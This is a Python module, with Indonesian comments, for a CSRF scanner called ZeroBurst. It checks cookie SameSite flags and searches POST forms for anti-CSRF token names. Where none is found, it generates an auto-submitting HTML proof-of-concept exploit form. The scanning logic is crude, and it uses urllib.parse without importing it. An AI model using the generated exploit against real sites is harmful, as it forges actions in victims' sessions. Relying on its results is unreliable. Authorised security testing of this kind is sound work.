import requests
import re
from bs4 import BeautifulSoup
from colorama import Fore, Style

class CSRFHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        # Header browser standar agar server mengirim form lengkap
        self.session.headers = {
            'User-Agent': 'ZeroBurst-CSRF-Hunter/17.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9'
        }
        
        # Database nama-nama input yang biasa dipakai untuk Token
        self.token_names = [
            'csrf', 'csrf_token', '_token', 'authenticity_token', 
            'nonce', '__requestverificationtoken', 'xsrf', 'xsrf_token',
            'cms_token', 'csrf-token-id'
        ]

    def analyze_cookies(self, response):
        """Menganalisis keamanan Cookies (SameSite)"""
        print(f"\n{Fore.YELLOW}[+] Analyzing Session Cookies Attributes...{Style.RESET_ALL}")
        cookies = response.cookies
        
        if not cookies:
            print(f"   {Fore.WHITE}No cookies set by server (Stateless/API?). CSRF might not apply.")
            return False

        safe_cookies = 0
        total_cookies = 0

        for cookie in cookies:
            total_cookies += 1
            # Cek atribut SameSite (Python requests cookie jar kadang menyembunyikan ini, kita cek raw headers jika perlu)
            # Namun kita coba akses via objek cookie dulu jika support
            
            # Simulasi deteksi (karena requests object seringkali tidak menyimpan flag SameSite dengan jelas)
            # Kita asumsikan default browser behavior jika tidak diset
            
            flags = []
            if cookie.secure: flags.append("Secure")
            
            # Cek manual di headers karena 'requests' cookie jar melimitasi atribut
            # Kita cari di Set-Cookie header raw
            raw_cookie_header = response.headers.get('Set-Cookie', '')
            
            samesite = "None (Vulnerable)"
            if "SameSite=Strict" in raw_cookie_header:
                samesite = "Strict (Safe)"
                safe_cookies += 1
            elif "SameSite=Lax" in raw_cookie_header:
                samesite = "Lax (Safe)"
                safe_cookies += 1
            
            color = Fore.GREEN if "Safe" in samesite else Fore.RED
            print(f"   ├── Cookie: {Fore.WHITE}{cookie.name:<15} | SameSite: {color}{samesite}{Style.RESET_ALL}")

        if safe_cookies < total_cookies:
            print(f"   {Fore.RED}[!] Warning: Cookies found without SameSite restriction.{Style.RESET_ALL}")
            return True # Berpotensi Vuln
        return False

    def generate_poc(self, action_url, method, inputs):
        """Membuat HTML Exploit otomatis untuk bukti"""
        poc = f"""
        <html>
          <body>
            <script>history.pushState('', '', '/')</script>
            <form action="{action_url}" method="{method}">
        """
        for name, val in inputs.items():
            poc += f'      <input type="hidden" name="{name}" value="{val}" />\n'
        
        poc += """      <input type="submit" value="Submit request" />
            </form>
            <script>
              document.forms[0].submit();
            </script>
          </body>
        </html>
        """
        return poc

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: CSRF Vulnerability Hunter (Indicative){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        try:
            res = self.session.get(self.target, timeout=10)
            
            # 1. ANALISIS COOKIE
            cookie_risk = self.analyze_cookies(res)
            
            # 2. ANALISIS FORM HTML
            print(f"\n{Fore.YELLOW}[+] Parsing HTML Forms for Anti-CSRF Tokens...{Style.RESET_ALL}")
            soup = BeautifulSoup(res.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                print(f"{Fore.WHITE}[-] No HTML forms found on this page.")
                return

            vuln_forms = 0

            for i, form in enumerate(forms):
                action = form.get('action')
                method = form.get('method', 'get').lower()
                
                # CSRF biasanya menyerang POST (State changing)
                if method != 'post':
                    continue
                
                # Normalisasi Action URL
                if not action: action = self.target
                if not action.startswith('http'):
                    action = urllib.parse.urljoin(self.target, action)

                print(f"\n   {Fore.WHITE}>>> Inspecting Form #{i+1} (POST to {action[:30]}...){Style.RESET_ALL}")
                
                # Cari Input Fields
                inputs = form.find_all('input')
                form_data = {}
                has_token = False
                token_name_found = ""

                for inp in inputs:
                    name = inp.get('name')
                    val = inp.get('value', 'test_value')
                    type_attr = inp.get('type', 'text')
                    
                    if not name: continue
                    form_data[name] = val
                    
                    # Deteksi Token
                    # Cek apakah nama input ada di database token_names kita
                    # Atau apakah typenya hidden dan valuenya acak panjang (heuristic)
                    if name.lower() in self.token_names:
                        has_token = True
                        token_name_found = name
                    elif type_attr == 'hidden' and len(val) > 20 and 'id' not in name:
                        # Kemungkinan token jika hidden & panjang
                        # Tapi ini spekulatif
                        pass

                # KEPUTUSAN FINAL
                if has_token:
                    print(f"      {Fore.GREEN}[SAFE] Anti-CSRF Token detected: '{token_name_found}'{Style.RESET_ALL}")
                else:
                    print(f"      {Fore.RED}[CRITICAL] NO ANTI-CSRF TOKEN FOUND!{Style.RESET_ALL}")
                    vuln_forms += 1
                    
                    # Jika cookie juga berisiko, ini temuan valid
                    if cookie_risk:
                        print(f"      {Fore.RED}[CONFIRMED] High Probability of CSRF (No Token + Weak Cookies){Style.RESET_ALL}")
                        
                        # Generate PoC
                        print(f"      {Fore.MAGENTA}[*] Generating PoC Exploit Code...{Style.RESET_ALL}")
                        poc_code = self.generate_poc(action, "POST", form_data)
                        print(f"{Fore.WHITE}      --------------------------------------------------")
                        # Print baris pertama saja biar ga menuhin layar
                        print(f"      {poc_code.splitlines()[3].strip()} ... (Save to .html to test)") 
                        print(f"{Fore.WHITE}      --------------------------------------------------")

            if vuln_forms == 0:
                print(f"\n{Fore.GREEN}[OK] All POST forms appear to have CSRF protection.{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")

def run_csrf_scan(url):
    engine = CSRFHunter(url)
    engine.run_scan()